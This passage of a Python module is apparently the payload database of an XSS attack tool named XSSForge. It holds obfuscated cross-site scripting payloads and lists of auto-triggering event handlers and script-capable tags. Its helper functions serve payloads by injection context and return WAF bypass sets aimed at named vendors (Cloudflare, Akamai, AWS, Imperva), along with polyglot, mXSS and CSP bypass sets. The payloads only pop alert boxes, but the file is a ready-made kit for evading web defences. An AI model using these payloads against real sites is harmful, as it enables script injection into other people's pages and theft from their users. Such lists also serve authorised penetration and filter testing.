        '<img src=x onerror=window[`al`+`ert`](1)>',
        '<svg onload=this[`alert`](1)>',
        '<img src=x onerror=[].constructor.constructor`alert\\x281\\x29```>',
        '<svg onload=Function`alert\\x281\\x29```>',
        '<img src=x onerror=setTimeout`alert\\x281\\x29`>',
        '<svg onload=setInterval`alert\\x281\\x29`,0>',
        '<img src=x onerror=eval`alert\\x281\\x29`>',
        '<svg onload=eval(URL.createObjectURL(new Blob([`alert(1)`])))>',
        '<img src=x onerror=eval(atob(`YWxlcnQoMSk=`))>',
        '<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
    ],
}


# ============================================================================
# EVENT HANDLERS - Complete Reference
# ============================================================================

EVENT_HANDLERS: dict[str, list[str]] = {
    # Auto-trigger events (no user interaction required)
    "auto_trigger": [
        "onload", "onerror", "onanimationstart", "onanimationend", "onanimationiteration",
        "ontransitionstart", "ontransitionend", "ontransitionrun", "ontransitioncancel",
        "onbegin", "onend", "onrepeat",  # SVG
        "onfocus", "onfocusin", "onblur", "onfocusout",
        "ontoggle", "onpageshow", "onpagereveal", "onpagerestore", "onhashchange", "onpopstate",
        "onloadstart", "onloadeddata", "onloadedmetadata", "oncanplay", "oncanplaythrough",
        "ondurationchange", "onplay", "onplaying", "onprogress", "onsuspend", "ontimeupdate",
        "onscroll", "onscrollend", "onscrollsnapchange", "onscrollsnapchanging",
        "oncontentvisibilityautostatechange", "onsecuritypolicyviolation",
        "onstart", "onfinish",  # marquee
        "onmessage", "onunhandledrejection", "onrejectionhandled",
        "onreadystatechange", "onbeforeprint", "onafterprint",
        "onstorage", "ononline", "onoffline",
        "onbeforematch", "onformdata",
    ],

    # User interaction required
    "user_interaction": [
        "onclick", "ondblclick", "onmousedown", "onmouseup", "onmouseover", "onmouseout",
        "onmouseenter", "onmouseleave", "onmousemove", "oncontextmenu", "onauxclick",
        "onpointerdown", "onpointerup", "onpointerenter", "onpointerleave", "onpointermove",
        "onpointerover", "onpointerout", "onpointercancel", "onpointerrawupdate",
        "ongotpointercapture", "onlostpointercapture",
        "ontouchstart", "ontouchend", "ontouchmove", "ontouchcancel",
        "onkeydown", "onkeyup", "onkeypress",
        "ondrag", "ondragstart", "ondragend", "ondragenter", "ondragleave", "ondragover", "ondrop",
        "oncopy", "oncut", "onpaste",
        "onchange", "oninput", "onbeforeinput", "oninvalid", "onreset", "onsubmit", "onselect",
        "onwheel", "onshow", "onselectionchange", "onselectstart",
    ],

    # Media events
    "media": [
        "onabort", "oncanplay", "oncanplaythrough", "ondurationchange", "onemptied",
        "onended", "onerror", "onloadeddata", "onloadedmetadata", "onloadstart",
        "onpause", "onplay", "onplaying", "onprogress", "onratechange", "onseeked",
        "onseeking", "onstalled", "onsuspend", "ontimeupdate", "onvolumechange", "onwaiting",
        "onencrypted", "onwaitingforkey",
    ],
}


# ============================================================================
# XSS-CAPABLE TAGS - Tags that can execute JavaScript
# ============================================================================

XSS_TAGS: list[str] = [
    # Common XSS tags
    "script", "img", "svg", "body", "iframe", "input", "select", "textarea",
    "button", "form", "details", "marquee", "video", "audio", "source",
    "object", "embed", "a", "math", "div", "span", "style", "link", "base",
    "meta", "keygen", "isindex", "bgsound", "table", "td", "th",

    # SVG-specific
    "animate", "set", "handler", "foreignObject", "circle", "rect", "line",
    "use", "image", "desc", "discard", "animation", "tref",

    # HTML5 elements
    "template", "portal", "track",

    # Deprecated but may work
    "applet", "layer", "ilayer", "blink",

    # Custom elements (bypass sanitizers)
    "xss", "x", "custom-element", "my-element",
]


# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def get_all_payloads() -> list[str]:
    """Get ALL payloads from all categories."""
    all_payloads = []
    for category in ULTIMATE_PAYLOADS.values():
        all_payloads.extend(category)
    return list(dict.fromkeys(all_payloads))  # Dedupe while preserving order


def get_payloads_for_context(context: str) -> list[str]:
    """Get payloads for a specific context."""
    context_map = {
        "html": "html",
        "html_body": "html",
        "attr_double": "attr_double",
        "attr_single": "attr_single",
        "attr_unquoted": "attr_unquoted",
        "attribute": "attr_double",  # Default to double quote
        "js_double": "js_double",
        "js_single": "js_single",
        "js_template": "js_template",
        "js_code": "js_code",
        "javascript": "js_double",  # Default to double quote
        "url": "url",
        "href": "url",
        # Event handler contexts (e.g., onload="func('INPUT')")
        "js_eventhandler_double": "js_double",  # Input in double-quoted event handler
        "js_eventhandler_single": "js_single",  # Input in single-quoted event handler
    }
    key = context_map.get(context.lower(), "html")
    return ULTIMATE_PAYLOADS.get(key, ULTIMATE_PAYLOADS["html"])


def get_waf_bypass_payloads(waf: str) -> list[str]:
    """Get WAF-specific bypass payloads."""
    waf_map = {
        "cloudflare": "waf_cloudflare",
        "akamai": "waf_akamai",
        "modsecurity": "waf_modsecurity",
        "mod_security": "waf_modsecurity",
        "aws": "waf_aws",
        "aws_waf": "waf_aws",
        "imperva": "waf_imperva",
        "incapsula": "waf_imperva",
    }
    key = waf_map.get(waf.lower(), "waf_generic")
    return ULTIMATE_PAYLOADS.get(key, ULTIMATE_PAYLOADS["waf_generic"])


def get_polyglots() -> list[str]:
    """Get polyglot payloads that work in multiple contexts."""
    return ULTIMATE_PAYLOADS["polyglot"]


def get_mxss_payloads() -> list[str]:
    """Get mXSS/sanitizer bypass payloads."""
    return ULTIMATE_PAYLOADS["mxss"]


def get_csp_bypass_payloads() -> list[str]:
    """Get CSP bypass payloads."""
    return ULTIMATE_PAYLOADS["csp_bypass"]


def get_auto_trigger_events() -> list[str]:
    """Get events that trigger automatically without user interaction."""
    return EVENT_HANDLERS["auto_trigger"]


def get_payload_count() -> int:
    """Get total unique payload count."""
    return len(get_all_payloads())


@dataclass
class PayloadStats:
    """Statistics about the payload database."""
    total: int
    html: int
    attr_double: int
    attr_single: int
    attr_unquoted: int
    js_double: int
    js_single: int
    js_template: int
    url: int
    polyglot: int
    mxss: int
    csp_bypass: int
    waf_total: int
    auto_trigger_events: int
    xss_tags: int


def get_stats() -> PayloadStats:
    """Get statistics about the payload database."""
    waf_total = sum(
        len(v) for k, v in ULTIMATE_PAYLOADS.items() if k.startswith("waf_")
    )
    return PayloadStats(
        total=get_payload_count(),
        html=len(ULTIMATE_PAYLOADS["html"]),
        attr_double=len(ULTIMATE_PAYLOADS["attr_double"]),
        attr_single=len(ULTIMATE_PAYLOADS["attr_single"]),
        attr_unquoted=len(ULTIMATE_PAYLOADS["attr_unquoted"]),
        js_double=len(ULTIMATE_PAYLOADS["js_double"]),
        js_single=len(ULTIMATE_PAYLOADS["js_single"]),
        js_template=len(ULTIMATE_PAYLOADS["js_template"]),
        url=len(ULTIMATE_PAYLOADS["url"]),
        polyglot=len(ULTIMATE_PAYLOADS["polyglot"]),
        mxss=len(ULTIMATE_PAYLOADS["mxss"]),
        csp_bypass=len(ULTIMATE_PAYLOADS["csp_bypass"]),
        waf_total=waf_total,
        auto_trigger_events=len(EVENT_HANDLERS["auto_trigger"]),
        xss_tags=len(XSS_TAGS),
    )


# Print stats when run directly
if __name__ == "__main__":
    stats = get_stats()
    print(f"XSSForge Ultimate Payload Database v2.0")
    print(f"=" * 50)
    print(f"Total Unique Payloads: {stats.total}")
    print(f"")
    print(f"By Context:")
    print(f"  HTML Body:       {stats.html}")
    print(f"  Attr (double):   {stats.attr_double}")
    print(f"  Attr (single):   {stats.attr_single}")
    print(f"  Attr (unquoted): {stats.attr_unquoted}")
    print(f"  JS (double):     {stats.js_double}")
    print(f"  JS (single):     {stats.js_single}")
    print(f"  JS (template):   {stats.js_template}")
    print(f"  URL/Href:        {stats.url}")
    print(f"")
    print(f"Special:")
    print(f"  Polyglots:       {stats.polyglot}")
    print(f"  mXSS:            {stats.mxss}")
    print(f"  CSP Bypass:      {stats.csp_bypass}")
    print(f"  WAF Bypass:      {stats.waf_total}")
    print(f"")
    print(f"References:")
    print(f"  Auto-trigger events: {stats.auto_trigger_events}")
    print(f"  XSS-capable tags:    {stats.xss_tags}")
